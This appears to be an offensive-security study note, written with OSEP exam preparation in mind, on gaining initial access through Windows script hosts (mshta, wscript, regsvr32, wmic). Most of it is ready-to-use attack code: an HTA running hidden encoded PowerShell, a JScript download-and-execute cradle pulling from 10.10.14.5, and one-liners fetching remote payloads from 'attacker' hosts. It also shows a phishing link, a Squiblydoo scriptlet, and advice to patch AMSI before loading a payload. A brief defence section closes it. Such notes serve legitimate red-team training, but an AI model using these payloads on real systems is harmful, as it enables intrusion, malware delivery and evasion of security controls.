---
title: JScript, HTA, and WSH initial access
slug: jscript-hta-wsh-initial-access
aliases: [jscript-initial-access, hta-payloads, wsh-payloads]
---

{% raw %}

> **TL;DR:** Windows ships three legacy script hosts — `mshta.exe` (HTA), `wscript.exe`/`cscript.exe` (WSH for .js/.vbs/.wsf), and a few weirder ones (`scriptrunner.exe`, `installutil.exe` via .NET). They run with the user's full privileges and are surprisingly forgiving of evasions. On OSEP you'll lean on them for low-friction first-stage execution. Companion to [[client-side-attacks-primer]] and [[office-vba-macros-initial-access]].

## HTA — HTML Application

A `.hta` file is HTML + script (JScript or VBScript) executed by `mshta.exe` outside the browser sandbox. Full local-user execution, no admin needed.

### Minimal HTA

```html
<html>
<head><title>Update</title></head>
<body>
<script language="VBScript">
  Set sh = CreateObject("WScript.Shell")
  sh.Run "powershell -nop -w hidden -ep bypass -enc " & _
         "JABjAD0ATgBlAHcA....", 0, False
  window.close()
</script>
</body>
</html>
```

### Delivery patterns

```text
# Direct fetch + execute (no file on disk):
mshta http://10.10.14.5/x.hta

# Local double-click:
invoice.hta in user's Downloads

# Inside a phishing landing page (browser will prompt to open):
<a href="http://attacker/x.hta">View document</a>
```

### Why it survives

`mshta.exe` is a signed Microsoft binary; AppLocker default rules often allow it. Detection is via behaviour — `mshta.exe` spawning `powershell.exe` is a classic alert. The OSEP-grade play hands off to a non-PowerShell loader from inside the HTA.

## JScript via wscript / cscript

A plain `.js` file double-clicked opens `WScript.exe`. Use a delivery vector that gets the user to extract a zip (which often strips MOTW) and double-click.

```javascript
// run.js
var sh = new ActiveXObject("WScript.Shell");
sh.Run(
  "powershell -nop -w hidden -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/p.ps1')",
  0,
  false
);
```

### WSF (Windows Script File)

A WSF lets you mix JScript and VBScript and reference COM objects. Useful when one half needs WMI calls and the other half needs string mangling.

```xml
<package>
  <job id="main">
    <script language="JScript">
      var sh = new ActiveXObject("Shell.Application");
      sh.ShellExecute("cmd.exe", "/c whoami > %TEMP%\\who.txt", "", "open", 0);
    </script>
  </job>
</package>
```

## DotNetToJScript pattern

`DotNetToJScript` (James Forshaw / tyranid) converts a .NET assembly into a JScript wrapper that uses `Activator.CreateInstance` via the .NET-to-COM bridge. The JScript file loads and runs your full .NET assembly with no `.exe` on disk.

Result: write your loader in C#, ship as `.js`, execute under `wscript.exe`. Defenders see a JScript file but the heavy lifting is .NET. This was the original vehicle for many OSEP-era loaders.

## XSL / WMIC

```text
wmic os get /format:"http://attacker/payload.xsl"
```

WMIC fetches a remote XSL stylesheet that contains an embedded `<script>` block; XSLT processor executes the script. Now mostly deprecated (`wmic.exe` removed from Windows 11) but still relevant on legacy targets.

## Squiblydoo — regsvr32 + scrobj.dll

```text
regsvr32.exe /s /n /u /i:http://attacker/file.sct scrobj.dll
```

`scrobj.dll` is Microsoft's script-object COM server. `regsvr32 /i` calls `DllRegisterServer`, which in this DLL evaluates the `<scriptlet>` content at the URL. Classic LOLBin: signed Microsoft binary executing arbitrary script from the network.

```xml
<?xml version="1.0"?>
<scriptlet>
<registration progid="x" classid="{...}">
  <script language="JScript">
    new ActiveXObject("WScript.Shell").Run("calc.exe");
  </script>
</registration>
</scriptlet>
```

## Squiblytwo — wmic with XSL (the variant)
Same shape as squiblydoo but uses `wmic` as the executor.

## When to pick which

| Goal | Pick |
|---|---|
| Single-file dropper, smallest VBA-free payload | HTA |
| Mail/zip delivery, double-click execution | JScript .js |
| AppLocker-bypass via signed LOLBin | Squiblydoo (regsvr32) |
| Need a full .NET runtime without a PE on disk | DotNetToJScript |
| Legacy XP/Win7 target | WSF or XLM macros |

## AMSI and these
- HTA: `mshta.exe` does *not* invoke AMSI on its host script (historically). Once you start `powershell.exe` from inside, AMSI re-enters.
- JScript via wscript: AMSI hooks `IActiveScript` since Win10 1903 — your script source *is* scanned. String split + obfuscate.
- `regsvr32 /i` via scrobj.dll: same scriptlet AMSI hooks apply.

The pattern that wins: minimal script that patches AMSI in its host process before doing anything noisy, then loads the real payload.

## Defence

- AppLocker default rules need to be tightened to block `mshta.exe`, `wscript.exe`, `cscript.exe`, `regsvr32.exe` from non-admin paths or via path/publisher rules.
- ASR rule "Block process creations originating from PSExec and WMI commands".
- Mark of the Web propagation — every modern container should keep MOTW.
- EDR: parent-child chain monitoring (e.g. `mshta.exe → powershell.exe`).

## References
- [LOLBAS — mshta](https://lolbas-project.github.io/lolbas/Binaries/Mshta/)
- [LOLBAS — regsvr32 (Squiblydoo)](https://lolbas-project.github.io/lolbas/Binaries/Regsvr32/)
- [tyranid/DotNetToJScript](https://github.com/tyranid/DotNetToJScript)
- [SubTee on script LOLBins](https://twitter.com/subTee)
- See also: [[client-side-attacks-primer]], [[office-vba-macros-initial-access]], [[applocker-bypass-techniques]], [[amsi-bypass]]

{% endraw %}
